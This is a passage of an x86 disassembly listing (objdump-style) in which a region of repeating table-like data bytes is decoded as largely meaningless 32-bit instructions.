  405fd3:	00 00                	add    %al,(%eax)
  405fd5:	01 01                	add    %eax,(%ecx)
  405fd7:	00 00                	add    %al,(%eax)
  405fd9:	00 09                	add    %cl,(%ecx)
  405fdb:	00 00                	add    %al,(%eax)
  405fdd:	00 02                	add    %al,(%edx)
  405fdf:	02 00                	add    (%eax),%al
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	0a 00                	or     (%eax),%al
  405fe5:	00 38                	add    %bh,(%eax)
  405fe7:	8b 8b 38 00 00 00    	mov    0x38(%ebx),%ecx
  405fed:	00 00                	add    %al,(%eax)
  405fef:	ca ca 00             	lret   $0xca
  405ff2:	00 00                	add    %al,(%eax)
  405ff4:	01 00                	add    %eax,(%eax)
  405ff6:	00 00                	add    %al,(%eax)
  405ff8:	81 81 00 00 00 0b 0c 	addl   $0xd0c,0xb000000(%ecx)
  405fff:	0d 00 00 
  406002:	00 00                	add    %al,(%eax)
  406004:	00 00                	add    %al,(%eax)
  406006:	00 00                	add    %al,(%eax)
  406008:	0e                   	push   %cs
  406009:	00 00                	add    %al,(%eax)
  40600b:	00 07                	add    %al,(%edi)
  40600d:	07                   	pop    %es
  40600e:	00 00                	add    %al,(%eax)
  406010:	00 01                	add    %al,(%ecx)
	...
  40601a:	0f 00 00             	sldt   (%eax)
  40601d:	00 00                	add    %al,(%eax)
  40601f:	00 00                	add    %al,(%eax)
  406021:	00 00                	add    %al,(%eax)
  406023:	10 0e                	adc    %cl,(%esi)
  406025:	00 00                	add    %al,(%eax)
  406027:	00 07                	add    %al,(%edi)
  406029:	07                   	pop    %es
  40602a:	00 00                	add    %al,(%eax)
  40602c:	00 01                	add    %al,(%ecx)
	...
  406036:	11 01                	adc    %eax,(%ecx)
	...
  406040:	01 00                	add    %eax,(%eax)
  406042:	00 00                	add    %al,(%eax)
  406044:	92                   	xchg   %eax,%edx
  406045:	92                   	xchg   %eax,%edx
  406046:	00 00                	add    %al,(%eax)
  406048:	00 01                	add    %al,(%ecx)
  40604a:	00 00                	add    %al,(%eax)
  40604c:	00 c6                	add    %al,%dh
  40604e:	c6 00 00             	movb   $0x0,(%eax)
  406051:	00 12                	add    %dl,(%edx)
  406053:	13 0e                	adc    (%esi),%ecx
  406055:	00 00                	add    %al,(%eax)
  406057:	00 07                	add    %al,(%edi)
  406059:	07                   	pop    %es
  40605a:	00 00                	add    %al,(%eax)
  40605c:	00 01                	add    %al,(%ecx)
	...
  406066:	11 01                	adc    %eax,(%ecx)
  406068:	00 00                	add    %al,(%eax)
  40606a:	00 01                	add    %al,(%ecx)
  40606c:	01 00                	add    %eax,(%eax)
  40606e:	00 00                	add    %al,(%eax)
  406070:	14 00                	adc    $0x0,%al
  406072:	00 00                	add    %al,(%eax)
  406074:	03 03                	add    (%ebx),%eax
  406076:	00 00                	add    %al,(%eax)
  406078:	00 15 01 00 00 00    	add    %dl,0x1
  40607e:	01 01                	add    %eax,(%ecx)
  406080:	00 00                	add    %al,(%eax)
  406082:	00 16                	add    %dl,(%esi)
  406084:	17                   	pop    %ss
  406085:	18 01                	sbb    %al,(%ecx)
  406087:	00 00                	add    %al,(%eax)
  406089:	00 01                	add    %al,(%ecx)
  40608b:	01 00                	add    %eax,(%eax)
  40608d:	00 00                	add    %al,(%eax)
  40608f:	12 13                	adc    (%ebx),%dl
  406091:	0e                   	push   %cs
  406092:	00 00                	add    %al,(%eax)
  406094:	00 07                	add    %al,(%edi)
  406096:	07                   	pop    %es
  406097:	00 00                	add    %al,(%eax)
  406099:	00 01                	add    %al,(%ecx)
	...
  4060a3:	11 01                	adc    %eax,(%ecx)
  4060a5:	00 00                	add    %al,(%eax)
  4060a7:	00 02                	add    %al,(%edx)
  4060a9:	02 00                	add    (%eax),%al
  4060ab:	00 00                	add    %al,(%eax)
  4060ad:	01 00                	add    %eax,(%eax)
  4060af:	00 00                	add    %al,(%eax)
  4060b1:	d7                   	xlat   %ds:(%ebx)
  4060b2:	d7                   	xlat   %ds:(%ebx)
  4060b3:	00 00                	add    %al,(%eax)
  4060b5:	00 01                	add    %al,(%ecx)
  4060b7:	00 00                	add    %al,(%eax)
  4060b9:	00 be be 00 00 00    	add    %bh,0xbe(%esi)
  4060bf:	12 13                	adc    (%ebx),%dl
  4060c1:	0e                   	push   %cs
  4060c2:	00 00                	add    %al,(%eax)
  4060c4:	00 07                	add    %al,(%edi)
  4060c6:	07                   	pop    %es
  4060c7:	00 00                	add    %al,(%eax)
  4060c9:	00 01                	add    %al,(%ecx)
	...
  4060d3:	11 01                	adc    %eax,(%ecx)
  4060d5:	00 00                	add    %al,(%eax)
  4060d7:	00 03                	add    %al,(%ebx)
  4060d9:	03 00                	add    (%eax),%eax
  4060db:	00 00                	add    %al,(%eax)
  4060dd:	14 00                	adc    $0x0,%al
  4060df:	00 00                	add    %al,(%eax)
  4060e1:	03 03                	add    (%ebx),%eax
  4060e3:	00 00                	add    %al,(%eax)
  4060e5:	00 15 01 00 00 00    	add    %dl,0x1
  4060eb:	03 03                	add    (%ebx),%eax
  4060ed:	00 00                	add    %al,(%eax)
  4060ef:	00 16                	add    %dl,(%esi)
  4060f1:	17                   	pop    %ss
  4060f2:	18 01                	sbb    %al,(%ecx)
  4060f4:	00 00                	add    %al,(%eax)
  4060f6:	00 98 98 00 00 00    	add    %bl,0x98(%eax)
  4060fc:	12 13                	adc    (%ebx),%dl
  4060fe:	0e                   	push   %cs
  4060ff:	00 00                	add    %al,(%eax)
  406101:	00 07                	add    %al,(%edi)
  406103:	07                   	pop    %es
  406104:	00 00                	add    %al,(%eax)
  406106:	00 01                	add    %al,(%ecx)
	...
  406110:	11 01                	adc    %eax,(%ecx)
  406112:	00 00                	add    %al,(%eax)
  406114:	00 04 04             	add    %al,(%esp,%eax,1)
  406117:	00 00                	add    %al,(%eax)
  406119:	00 14 00             	add    %dl,(%eax,%eax,1)
  40611c:	00 00                	add    %al,(%eax)
  40611e:	03 03                	add    (%ebx),%eax
  406120:	00 00                	add    %al,(%eax)
  406122:	00 15 01 00 00 00    	add    %dl,0x1
  406128:	04 04                	add    $0x4,%al
  40612a:	00 00                	add    %al,(%eax)
  40612c:	00 16                	add    %dl,(%esi)
  40612e:	17                   	pop    %ss
  40612f:	18 01                	sbb    %al,(%ecx)
  406131:	00 00                	add    %al,(%eax)
  406133:	00 cd                	add    %cl,%ch
  406135:	cd 00                	int    $0x0
  406137:	00 00                	add    %al,(%eax)
  406139:	12 13                	adc    (%ebx),%dl
  40613b:	0e                   	push   %cs
  40613c:	00 00                	add    %al,(%eax)
  40613e:	00 07                	add    %al,(%edi)
  406140:	07                   	pop    %es
  406141:	00 00                	add    %al,(%eax)
  406143:	00 01                	add    %al,(%ecx)
	...
  40614d:	11 01                	adc    %eax,(%ecx)
  40614f:	00 00                	add    %al,(%eax)
  406151:	00 05 05 00 00 00    	add    %al,0x5
  406157:	14 00                	adc    $0x0,%al
  406159:	00 00                	add    %al,(%eax)
  40615b:	03 03                	add    (%ebx),%eax
  40615d:	00 00                	add    %al,(%eax)
  40615f:	00 15 01 00 00 00    	add    %dl,0x1
  406165:	05 05 00 00 00       	add    $0x5,%eax
  40616a:	16                   	push   %ss
  40616b:	17                   	pop    %ss
  40616c:	18 01                	sbb    %al,(%ecx)
  40616e:	00 00                	add    %al,(%eax)
  406170:	00 1b                	add    %bl,(%ebx)
  406172:	1b 00                	sbb    (%eax),%eax
  406174:	00 00                	add    %al,(%eax)
  406176:	12 13                	adc    (%ebx),%dl
  406178:	0e                   	push   %cs
  406179:	00 00                	add    %al,(%eax)
  40617b:	00 07                	add    %al,(%edi)
  40617d:	07                   	pop    %es
  40617e:	00 00                	add    %al,(%eax)
  406180:	00 01                	add    %al,(%ecx)
	...
  40618a:	11 01                	adc    %eax,(%ecx)
  40618c:	00 00                	add    %al,(%eax)
  40618e:	00 06                	add    %al,(%esi)
  406190:	06                   	push   %es
  406191:	00 00                	add    %al,(%eax)
  406193:	00 14 00             	add    %dl,(%eax,%eax,1)
  406196:	00 00                	add    %al,(%eax)
  406198:	03 03                	add    (%ebx),%eax
  40619a:	00 00                	add    %al,(%eax)
  40619c:	00 15 01 00 00 00    	add    %dl,0x1
  4061a2:	06                   	push   %es
  4061a3:	06                   	push   %es
  4061a4:	00 00                	add    %al,(%eax)
  4061a6:	00 16                	add    %dl,(%esi)
  4061a8:	17                   	pop    %ss
  4061a9:	18 01                	sbb    %al,(%ecx)
  4061ab:	00 00                	add    %al,(%eax)
  4061ad:	00 dd                	add    %bl,%ch
  4061af:	dd 00                	fldl   (%eax)
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	12 13                	adc    (%ebx),%dl
  4061b5:	0e                   	push   %cs
  4061b6:	00 00                	add    %al,(%eax)
  4061b8:	00 07                	add    %al,(%edi)
  4061ba:	07                   	pop    %es
  4061bb:	00 00                	add    %al,(%eax)
  4061bd:	00 01                	add    %al,(%ecx)
	...
  4061c7:	11 01                	adc    %eax,(%ecx)
  4061c9:	00 00                	add    %al,(%eax)
  4061cb:	00 07                	add    %al,(%edi)
  4061cd:	07                   	pop    %es
  4061ce:	00 00                	add    %al,(%eax)
  4061d0:	00 01                	add    %al,(%ecx)
  4061d2:	00 00                	add    %al,(%eax)
  4061d4:	00 57 57             	add    %dl,0x57(%edi)
  4061d7:	00 00                	add    %al,(%eax)
  4061d9:	00 01                	add    %al,(%ecx)
  4061db:	00 00                	add    %al,(%eax)
  4061dd:	00 24 24             	add    %ah,(%esp)
  4061e0:	00 00                	add    %al,(%eax)
  4061e2:	00 12                	add    %dl,(%edx)
  4061e4:	13 0e                	adc    (%esi),%ecx
  4061e6:	00 00                	add    %al,(%eax)
  4061e8:	00 07                	add    %al,(%edi)
  4061ea:	07                   	pop    %es
  4061eb:	00 00                	add    %al,(%eax)
  4061ed:	00 01                	add    %al,(%ecx)
	...
  4061f7:	11 01                	adc    %eax,(%ecx)
  4061f9:	00 00                	add    %al,(%eax)
  4061fb:	00 08                	add    %cl,(%eax)
  4061fd:	08 00                	or     %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	14 00                	adc    $0x0,%al
  406203:	00 00                	add    %al,(%eax)
  406205:	03 03                	add    (%ebx),%eax
  406207:	00 00                	add    %al,(%eax)
  406209:	00 15 01 00 00 00    	add    %dl,0x1
  40620f:	08 08                	or     %cl,(%eax)
  406211:	00 00                	add    %al,(%eax)
  406213:	00 16                	add    %dl,(%esi)
  406215:	17                   	pop    %ss
  406216:	18 01                	sbb    %al,(%ecx)
  406218:	00 00                	add    %al,(%eax)
  40621a:	00 83 83 00 00 00    	add    %al,0x83(%ebx)
  406220:	12 13                	adc    (%ebx),%dl
  406222:	0e                   	push   %cs
  406223:	00 00                	add    %al,(%eax)
  406225:	00 07                	add    %al,(%edi)
  406227:	07                   	pop    %es
  406228:	00 00                	add    %al,(%eax)
  40622a:	00 01                	add    %al,(%ecx)
	...
  406234:	11 01                	adc    %eax,(%ecx)
  406236:	00 00                	add    %al,(%eax)
  406238:	00 09                	add    %cl,(%ecx)
  40623a:	09 00                	or     %eax,(%eax)
  40623c:	00 00                	add    %al,(%eax)
  40623e:	14 00                	adc    $0x0,%al
  406240:	00 00                	add    %al,(%eax)
  406242:	03 03                	add    (%ebx),%eax
  406244:	00 00                	add    %al,(%eax)
  406246:	00 15 01 00 00 00    	add    %dl,0x1
  40624c:	09 09                	or     %ecx,(%ecx)
  40624e:	00 00                	add    %al,(%eax)
  406250:	00 16                	add    %dl,(%esi)
  406252:	17                   	pop    %ss
  406253:	18 01                	sbb    %al,(%ecx)
  406255:	00 00                	add    %al,(%eax)
  406257:	00 53 53             	add    %dl,0x53(%ebx)
  40625a:	00 00                	add    %al,(%eax)
  40625c:	00 12                	add    %dl,(%edx)
  40625e:	13 0e                	adc    (%esi),%ecx
  406260:	00 00                	add    %al,(%eax)
  406262:	00 07                	add    %al,(%edi)
  406264:	07                   	pop    %es
  406265:	00 00                	add    %al,(%eax)
  406267:	00 01                	add    %al,(%ecx)
	...
  406271:	11 01                	adc    %eax,(%ecx)
  406273:	00 00                	add    %al,(%eax)
  406275:	00 0a                	add    %cl,(%edx)
  406277:	0a 00                	or     (%eax),%al
  406279:	00 00                	add    %al,(%eax)
  40627b:	14 00                	adc    $0x0,%al
  40627d:	00 00                	add    %al,(%eax)
  40627f:	03 03                	add    (%ebx),%eax
  406281:	00 00                	add    %al,(%eax)
  406283:	00 15 01 00 00 00    	add    %dl,0x1
  406289:	0a 0a                	or     (%edx),%cl
  40628b:	00 00                	add    %al,(%eax)
  40628d:	00 16                	add    %dl,(%esi)
  40628f:	17                   	pop    %ss
  406290:	18 01                	sbb    %al,(%ecx)
  406292:	00 00                	add    %al,(%eax)
  406294:	00 bc bc 00 00 00 12 	add    %bh,0x12000000(%esp,%edi,4)
  40629b:	13 0e                	adc    (%esi),%ecx
  40629d:	00 00                	add    %al,(%eax)
  40629f:	00 07                	add    %al,(%edi)
  4062a1:	07                   	pop    %es
  4062a2:	00 00                	add    %al,(%eax)
  4062a4:	00 01                	add    %al,(%ecx)
	...
  4062ae:	11 01                	adc    %eax,(%ecx)
  4062b0:	00 00                	add    %al,(%eax)
  4062b2:	00 0b                	add    %cl,(%ebx)
  4062b4:	0b 00                	or     (%eax),%eax
  4062b6:	00 00                	add    %al,(%eax)
  4062b8:	14 00                	adc    $0x0,%al
  4062ba:	00 00                	add    %al,(%eax)
  4062bc:	03 03                	add    (%ebx),%eax
  4062be:	00 00                	add    %al,(%eax)
  4062c0:	00 15 01 00 00 00    	add    %dl,0x1
  4062c6:	0b 0b                	or     (%ebx),%ecx
  4062c8:	00 00                	add    %al,(%eax)
  4062ca:	00 16                	add    %dl,(%esi)
  4062cc:	17                   	pop    %ss
  4062cd:	18 01                	sbb    %al,(%ecx)
  4062cf:	00 00                	add    %al,(%eax)
  4062d1:	00 94 94 00 00 00 12 	add    %dl,0x12000000(%esp,%edx,4)
  4062d8:	13 0e                	adc    (%esi),%ecx
  4062da:	00 00                	add    %al,(%eax)
  4062dc:	00 07                	add    %al,(%edi)
  4062de:	07                   	pop    %es
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 01                	add    %al,(%ecx)
	...
  4062eb:	11 01                	adc    %eax,(%ecx)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 0c 0c             	add    %cl,(%esp,%ecx,1)
  4062f2:	00 00                	add    %al,(%eax)
  4062f4:	00 01                	add    %al,(%ecx)
  4062f6:	00 00                	add    %al,(%eax)
  4062f8:	00 28                	add    %ch,(%eax)
  4062fa:	28 00                	sub    %al,(%eax)
  4062fc:	00 00                	add    %al,(%eax)
  4062fe:	01 00                	add    %eax,(%eax)
  406300:	00 00                	add    %al,(%eax)
  406302:	51                   	push   %ecx
  406303:	51                   	push   %ecx
  406304:	00 00                	add    %al,(%eax)
  406306:	00 12                	add    %dl,(%edx)
  406308:	13 0e                	adc    (%esi),%ecx
  40630a:	00 00                	add    %al,(%eax)
  40630c:	00 07                	add    %al,(%edi)
  40630e:	07                   	pop    %es
  40630f:	00 00                	add    %al,(%eax)
  406311:	00 01                	add    %al,(%ecx)
	...
  40631b:	11 01                	adc    %eax,(%ecx)
  40631d:	00 00                	add    %al,(%eax)
  40631f:	00 0d 0d 00 00 00    	add    %cl,0xd
  406325:	14 00                	adc    $0x0,%al
  406327:	00 00                	add    %al,(%eax)
  406329:	03 03                	add    (%ebx),%eax
  40632b:	00 00                	add    %al,(%eax)
  40632d:	00 15 01 00 00 00    	add    %dl,0x1
  406333:	0d 0d 00 00 00       	or     $0xd,%eax
  406338:	16                   	push   %ss
  406339:	17                   	pop    %ss
  40633a:	18 01                	sbb    %al,(%ecx)
  40633c:	00 00                	add    %al,(%eax)
  40633e:	00 b9 b9 00 00 00    	add    %bh,0xb9(%ecx)
  406344:	12 13                	adc    (%ebx),%dl
  406346:	0e                   	push   %cs
  406347:	00 00                	add    %al,(%eax)
  406349:	00 07                	add    %al,(%edi)
  40634b:	07                   	pop    %es
  40634c:	00 00                	add    %al,(%eax)
  40634e:	00 01                	add    %al,(%ecx)
	...
  406358:	11 01                	adc    %eax,(%ecx)
  40635a:	00 00                	add    %al,(%eax)
  40635c:	00 0e                	add    %cl,(%esi)
  40635e:	0e                   	push   %cs
  40635f:	00 00                	add    %al,(%eax)
  406361:	00 01                	add    %al,(%ecx)
  406363:	00 00                	add    %al,(%eax)
  406365:	00 a6 a6 00 00 00    	add    %ah,0xa6(%esi)
  40636b:	01 00                	add    %eax,(%eax)
  40636d:	00 00                	add    %al,(%eax)
  40636f:	d1 d1                	rcl    $1,%ecx
  406371:	00 00                	add    %al,(%eax)
  406373:	00 12                	add    %dl,(%edx)
  406375:	13 0e                	adc    (%esi),%ecx
  406377:	00 00                	add    %al,(%eax)
  406379:	00 07                	add    %al,(%edi)
  40637b:	07                   	pop    %es
  40637c:	00 00                	add    %al,(%eax)
  40637e:	00 01                	add    %al,(%ecx)
	...
  406388:	11 01                	adc    %eax,(%ecx)
  40638a:	00 00                	add    %al,(%eax)
  40638c:	00 0f                	add    %cl,(%edi)
  40638e:	0f 00 00             	sldt   (%eax)
  406391:	00 14 00             	add    %dl,(%eax,%eax,1)
  406394:	00 00                	add    %al,(%eax)
  406396:	03 03                	add    (%ebx),%eax
  406398:	00 00                	add    %al,(%eax)
  40639a:	00 15 01 00 00 00    	add    %dl,0x1
  4063a0:	0f                   	(bad)
  4063a1:	0f 00 00             	sldt   (%eax)
  4063a4:	00 16                	add    %dl,(%esi)
  4063a6:	17                   	pop    %ss
  4063a7:	18 01                	sbb    %al,(%ecx)
  4063a9:	00 00                	add    %al,(%eax)
  4063ab:	00 9e 9e 00 00 00    	add    %bl,0x9e(%esi)
  4063b1:	12 13                	adc    (%ebx),%dl
  4063b3:	0e                   	push   %cs
  4063b4:	00 00                	add    %al,(%eax)
  4063b6:	00 07                	add    %al,(%edi)
  4063b8:	07                   	pop    %es
  4063b9:	00 00                	add    %al,(%eax)
  4063bb:	00 01                	add    %al,(%ecx)
	...
  4063c5:	11 01                	adc    %eax,(%ecx)
  4063c7:	00 00                	add    %al,(%eax)
  4063c9:	00 10                	add    %dl,(%eax)
  4063cb:	10 00                	adc    %al,(%eax)
  4063cd:	00 00                	add    %al,(%eax)
  4063cf:	14 00                	adc    $0x0,%al
  4063d1:	00 00                	add    %al,(%eax)
  4063d3:	03 03                	add    (%ebx),%eax
  4063d5:	00 00                	add    %al,(%eax)
  4063d7:	00 15 01 00 00 00    	add    %dl,0x1
  4063dd:	10 10                	adc    %dl,(%eax)
  4063df:	00 00                	add    %al,(%eax)
  4063e1:	00 16                	add    %dl,(%esi)
  4063e3:	17                   	pop    %ss
  4063e4:	18 01                	sbb    %al,(%ecx)
  4063e6:	00 00                	add    %al,(%eax)
  4063e8:	00 a9 a9 00 00 00    	add    %ch,0xa9(%ecx)
  4063ee:	12 13                	adc    (%ebx),%dl
  4063f0:	0e                   	push   %cs
  4063f1:	00 00                	add    %al,(%eax)
  4063f3:	00 07                	add    %al,(%edi)
  4063f5:	07                   	pop    %es
  4063f6:	00 00                	add    %al,(%eax)
  4063f8:	00 01                	add    %al,(%ecx)
	...
  406402:	11 01                	adc    %eax,(%ecx)
  406404:	00 00                	add    %al,(%eax)
  406406:	00 11                	add    %dl,(%ecx)
  406408:	11 00                	adc    %eax,(%eax)
  40640a:	00 00                	add    %al,(%eax)
  40640c:	01 00                	add    %eax,(%eax)
  40640e:	00 00                	add    %al,(%eax)
  406410:	4f                   	dec    %edi
  406411:	4f                   	dec    %edi
  406412:	00 00                	add    %al,(%eax)
  406414:	00 01                	add    %al,(%ecx)
  406416:	00 00                	add    %al,(%eax)
  406418:	00 6f 6f             	add    %ch,0x6f(%edi)
  40641b:	00 00                	add    %al,(%eax)
  40641d:	00 12                	add    %dl,(%edx)
  40641f:	13 0e                	adc    (%esi),%ecx
  406421:	00 00                	add    %al,(%eax)
  406423:	00 07                	add    %al,(%edi)
  406425:	07                   	pop    %es
  406426:	00 00                	add    %al,(%eax)
  406428:	00 01                	add    %al,(%ecx)
	...
  406432:	11 01                	adc    %eax,(%ecx)
  406434:	00 00                	add    %al,(%eax)
  406436:	00 12                	add    %dl,(%edx)
  406438:	12 00                	adc    (%eax),%al
  40643a:	00 00                	add    %al,(%eax)
  40643c:	01 00                	add    %eax,(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	28 28                	sub    %ch,(%eax)
  406442:	00 00                	add    %al,(%eax)
  406444:	00 01                	add    %al,(%ecx)
  406446:	00 00                	add    %al,(%eax)
  406448:	00 58 58             	add    %bl,0x58(%eax)
  40644b:	00 00                	add    %al,(%eax)
  40644d:	00 12                	add    %dl,(%edx)
  40644f:	13 0e                	adc    (%esi),%ecx
  406451:	00 00                	add    %al,(%eax)
  406453:	00 07                	add    %al,(%edi)
  406455:	07                   	pop    %es
  406456:	00 00                	add    %al,(%eax)
  406458:	00 01                	add    %al,(%ecx)
	...
  406462:	11 01                	adc    %eax,(%ecx)
  406464:	00 00                	add    %al,(%eax)
  406466:	00 13                	add    %dl,(%ebx)
  406468:	13 00                	adc    (%eax),%eax
  40646a:	00 00                	add    %al,(%eax)
  40646c:	01 00                	add    %eax,(%eax)
  40646e:	00 00                	add    %al,(%eax)
  406470:	e2 e2                	loop   0x406454
  406472:	00 00                	add    %al,(%eax)
  406474:	00 01                	add    %al,(%ecx)
  406476:	00 00                	add    %al,(%eax)
  406478:	00 90 90 00 00 00    	add    %dl,0x90(%eax)
  40647e:	12 13                	adc    (%ebx),%dl
  406480:	0e                   	push   %cs
  406481:	00 00                	add    %al,(%eax)
  406483:	00 07                	add    %al,(%edi)
  406485:	07                   	pop    %es
  406486:	00 00                	add    %al,(%eax)
  406488:	00 01                	add    %al,(%ecx)
	...
  406492:	11 01                	adc    %eax,(%ecx)
  406494:	00 00                	add    %al,(%eax)
  406496:	00 14 14             	add    %dl,(%esp,%edx,1)
  406499:	00 00                	add    %al,(%eax)
  40649b:	00 01                	add    %al,(%ecx)
  40649d:	00 00                	add    %al,(%eax)
  40649f:	00 e2                	add    %ah,%dl
  4064a1:	e2 00                	loop   0x4064a3
  4064a3:	00 00                	add    %al,(%eax)
  4064a5:	01 00                	add    %eax,(%eax)
  4064a7:	00 00                	add    %al,(%eax)
  4064a9:	8d 8d 00 00 00 12    	lea    0x12000000(%ebp),%ecx
  4064af:	13 0e                	adc    (%esi),%ecx
  4064b1:	00 00                	add    %al,(%eax)
  4064b3:	00 07                	add    %al,(%edi)
  4064b5:	07                   	pop    %es
  4064b6:	00 00                	add    %al,(%eax)
  4064b8:	00 01                	add    %al,(%ecx)
	...
  4064c2:	11 01                	adc    %eax,(%ecx)
  4064c4:	00 00                	add    %al,(%eax)
  4064c6:	00 15 15 00 00 00    	add    %dl,0x15
  4064cc:	01 00                	add    %eax,(%eax)
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	aa                   	stos   %al,%es:(%edi)
  4064d1:	aa                   	stos   %al,%es:(%edi)
  4064d2:	00 00                	add    %al,(%eax)
  4064d4:	00 01                	add    %al,(%ecx)
  4064d6:	00 00                	add    %al,(%eax)
  4064d8:	00 de                	add    %bl,%dh
  4064da:	de 00                	fiadds (%eax)
  4064dc:	00 00                	add    %al,(%eax)
  4064de:	12 13                	adc    (%ebx),%dl
  4064e0:	0e                   	push   %cs
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 07                	add    %al,(%edi)
  4064e5:	07                   	pop    %es
  4064e6:	00 00                	add    %al,(%eax)
  4064e8:	00 01                	add    %al,(%ecx)
	...
  4064f2:	11 01                	adc    %eax,(%ecx)
  4064f4:	00 00                	add    %al,(%eax)
  4064f6:	00 16                	add    %dl,(%esi)
  4064f8:	16                   	push   %ss
  4064f9:	00 00                	add    %al,(%eax)
  4064fb:	00 01                	add    %al,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 cb                	add    %cl,%bl
  406501:	cb                   	lret
  406502:	00 00                	add    %al,(%eax)
  406504:	00 01                	add    %al,(%ecx)
  406506:	00 00                	add    %al,(%eax)
  406508:	00 ae ae 00 00 00    	add    %ch,0xae(%esi)
  40650e:	12 13                	adc    (%ebx),%dl
  406510:	0e                   	push   %cs
  406511:	00 00                	add    %al,(%eax)
  406513:	00 07                	add    %al,(%edi)
  406515:	07                   	pop    %es
  406516:	00 00                	add    %al,(%eax)
  406518:	00 01                	add    %al,(%ecx)
	...
  406522:	11 01                	adc    %eax,(%ecx)
  406524:	00 00                	add    %al,(%eax)
  406526:	00 17                	add    %dl,(%edi)
  406528:	17                   	pop    %ss
  406529:	00 00                	add    %al,(%eax)
  40652b:	00 01                	add    %al,(%ecx)
  40652d:	00 00                	add    %al,(%eax)
  40652f:	00 04 04             	add    %al,(%esp,%eax,1)
  406532:	00 00                	add    %al,(%eax)
  406534:	00 01                	add    %al,(%ecx)
  406536:	00 00                	add    %al,(%eax)
  406538:	00 67 67             	add    %ah,0x67(%edi)
  40653b:	00 00                	add    %al,(%eax)
  40653d:	00 12                	add    %dl,(%edx)
  40653f:	13 0e                	adc    (%esi),%ecx
  406541:	00 00                	add    %al,(%eax)
  406543:	00 07                	add    %al,(%edi)
  406545:	07                   	pop    %es
  406546:	00 00                	add    %al,(%eax)
  406548:	00 01                	add    %al,(%ecx)
	...
  406552:	11 01                	adc    %eax,(%ecx)
  406554:	00 00                	add    %al,(%eax)
  406556:	00 18                	add    %bl,(%eax)
  406558:	18 00                	sbb    %al,(%eax)
  40655a:	00 00                	add    %al,(%eax)
  40655c:	01 00                	add    %eax,(%eax)
  40655e:	00 00                	add    %al,(%eax)
  406560:	ab                   	stos   %eax,%es:(%edi)
  406561:	ab                   	stos   %eax,%es:(%edi)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 01                	add    %al,(%ecx)
  406566:	00 00                	add    %al,(%eax)
  406568:	00 df                	add    %bl,%bh
  40656a:	df 00                	filds  (%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	12 13                	adc    (%ebx),%dl
  406570:	0e                   	push   %cs
  406571:	00 00                	add    %al,(%eax)
  406573:	00 07                	add    %al,(%edi)
  406575:	07                   	pop    %es
  406576:	00 00                	add    %al,(%eax)
  406578:	00 01                	add    %al,(%ecx)
	...
  406582:	11 01                	adc    %eax,(%ecx)
  406584:	00 00                	add    %al,(%eax)
  406586:	00 19                	add    %bl,(%ecx)
  406588:	19 00                	sbb    %eax,(%eax)
  40658a:	00 00                	add    %al,(%eax)
  40658c:	14 00                	adc    $0x0,%al
  40658e:	00 00                	add    %al,(%eax)
  406590:	03 03                	add    (%ebx),%eax
  406592:	00 00                	add    %al,(%eax)
  406594:	00 15 01 00 00 00    	add    %dl,0x1
  40659a:	19 19                	sbb    %ebx,(%ecx)
  40659c:	00 00                	add    %al,(%eax)
  40659e:	00 16                	add    %dl,(%esi)
  4065a0:	17                   	pop    %ss
  4065a1:	18 01                	sbb    %al,(%ecx)
  4065a3:	00 00                	add    %al,(%eax)
  4065a5:	00 a3 a3 00 00 00    	add    %ah,0xa3(%ebx)
  4065ab:	12 13                	adc    (%ebx),%dl
  4065ad:	0e                   	push   %cs
  4065ae:	00 00                	add    %al,(%eax)
  4065b0:	00 07                	add    %al,(%edi)
  4065b2:	07                   	pop    %es
  4065b3:	00 00                	add    %al,(%eax)
  4065b5:	00 01                	add    %al,(%ecx)
	...
  4065bf:	11 01                	adc    %eax,(%ecx)
  4065c1:	00 00                	add    %al,(%eax)
  4065c3:	00 1a                	add    %bl,(%edx)
  4065c5:	1a 00                	sbb    (%eax),%al
  4065c7:	00 00                	add    %al,(%eax)
  4065c9:	01 00                	add    %eax,(%eax)
  4065cb:	00 00                	add    %al,(%eax)
  4065cd:	60                   	pusha
  4065ce:	60                   	pusha
  4065cf:	00 00                	add    %al,(%eax)
  4065d1:	00 01                	add    %al,(%ecx)
  4065d3:	00 00                	add    %al,(%eax)
  4065d5:	00 04 04             	add    %al,(%esp,%eax,1)
  4065d8:	00 00                	add    %al,(%eax)
  4065da:	00 12                	add    %dl,(%edx)
  4065dc:	13 0e                	adc    (%esi),%ecx
  4065de:	00 00                	add    %al,(%eax)
  4065e0:	00 07                	add    %al,(%edi)
  4065e2:	07                   	pop    %es
  4065e3:	00 00                	add    %al,(%eax)
  4065e5:	00 01                	add    %al,(%ecx)
	...
  4065ef:	11 01                	adc    %eax,(%ecx)
  4065f1:	00 00                	add    %al,(%eax)
  4065f3:	00 1b                	add    %bl,(%ebx)
  4065f5:	1b 00                	sbb    (%eax),%eax
  4065f7:	00 00                	add    %al,(%eax)
  4065f9:	14 00                	adc    $0x0,%al
  4065fb:	00 00                	add    %al,(%eax)
  4065fd:	03 03                	add    (%ebx),%eax
  4065ff:	00 00                	add    %al,(%eax)
  406601:	00 15 01 00 00 00    	add    %dl,0x1
  406607:	1b 1b                	sbb    (%ebx),%ebx
  406609:	00 00                	add    %al,(%eax)
  40660b:	00 16                	add    %dl,(%esi)
  40660d:	17                   	pop    %ss
  40660e:	18 01                	sbb    %al,(%ecx)
  406610:	00 00                	add    %al,(%eax)
  406612:	00 8c 8c 00 00 00 12 	add    %cl,0x12000000(%esp,%ecx,4)
  406619:	13 0e                	adc    (%esi),%ecx
  40661b:	00 00                	add    %al,(%eax)
  40661d:	00 07                	add    %al,(%edi)
  40661f:	07                   	pop    %es
  406620:	00 00                	add    %al,(%eax)
  406622:	00 01                	add    %al,(%ecx)
	...
  40662c:	11 01                	adc    %eax,(%ecx)
  40662e:	00 00                	add    %al,(%eax)
  406630:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  406633:	00 00                	add    %al,(%eax)
  406635:	00 14 00             	add    %dl,(%eax,%eax,1)
